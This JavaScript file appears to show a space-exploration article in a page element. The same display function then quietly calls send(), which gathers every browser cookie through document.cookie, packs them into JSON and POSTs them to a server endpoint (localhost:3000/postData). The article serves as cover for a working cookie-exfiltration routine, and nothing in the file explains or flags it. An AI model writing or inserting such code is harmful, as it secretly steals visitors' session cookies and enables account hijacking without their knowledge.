function cookiesToJson() {
    const cookies = document.cookie.split("; ");
    const cookieObject = {};
    for (const cookie of cookies) {
      const [name, value] = cookie.split("=");
      cookieObject[name] = decodeURIComponent(value);
    }
    return JSON.stringify(cookieObject);
}

function displayText() {
  $('#info').html(`Title: "Exploring the Frontiers of Space: Unveiling the Secrets Beyond Our Blue Planet"

          In the vast expanse of the cosmos, beyond the twinkling stars that decorate our night sky, lies a realm of wonder and mystery that has captured the imagination of humanity for centuries. Space, the ultimate frontier, continues to beckon us with its infinite possibilities, offering a canvas for scientific discovery, technological innovation, and philosophical contemplation.
          
          The story of space exploration is one of resilience, ingenuity, and a relentless pursuit of the unknown. From the early observations of celestial bodies by ancient civilizations to the modern marvels of robotic probes, telescopes, and human spaceflight, our journey to comprehend the cosmos has been marked by both triumphant successes and humbling setbacks.
          
          At the heart of our fascination with space lies an insatiable curiosity about our own origins and place in the universe. The quest to unravel the mysteries of distant planets, exoplanets, and cosmic phenomena not only expands our scientific knowledge but also challenges our fundamental understanding of life itself. Could there be other habitable worlds? Is Earth a rare gem or part of a cosmic tapestry of life? These questions fuel our collective desire to push the boundaries of exploration ever outward.
          
          Technological advancements have been the catalysts for our remarkable achievements in space. From the iconic Apollo moon landings to the revolutionary discoveries of the Hubble Space Telescope, each milestone has brought us closer to understanding the cosmos' intricate workings. Today, private enterprises are joining the ranks of governmental space agencies, opening up new avenues for collaboration, innovation, and the democratization of space access.
          
          However, the cosmic theater is not without its challenges. Astronomers and scientists grapple with deciphering the enigma of dark matter and dark energy, which together constitute the vast majority of the universe's content yet remain elusive to direct observation. Spacefarers must also contend with the harsh realities of long-duration space travel, from radiation exposure to the physiological effects of microgravity, as we set our sights on crewed missions to Mars and beyond.
          
          As we stand on the precipice of a new era of space exploration, characterized by renewed lunar ambitions, interplanetary voyages, and the quest for extraterrestrial life, it is essential to reflect on the broader implications of our endeavors. Space exploration transcends borders and politics, reminding us of our shared humanity and the fragility of our home planet. The technology spun off from space missions has led to countless innovations that improve life on Earth, from medical advancements to sustainable energy solutions.
          
          In this article, we embark on a journey through the cosmos, tracing the trajectory of humanity's exploration of space. We will delve into the scientific breakthroughs, the technological marvels, and the philosophical musings that have shaped our understanding of the universe. From the breathtaking landscapes of Mars to the dazzling rings of Saturn, from the scorching exoplanets to the icy reaches of the Kuiper Belt, join us as we venture into the great unknown, fueled by curiosity and driven by the desire to expand the horizons of human knowledge.`)
          send();
}

function send() {
    const requestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        data: cookiesToJson() // Convert data to JSON format
      };
      
      $.ajax({
        url: 'http://localhost:3000/postData',
        type: requestOptions.method,
        contentType: requestOptions.headers['Content-Type'],
        data: requestOptions.data,
        success: function(data) {},
        error: function(error) {
          console.error(error);
        }
      }); 
}
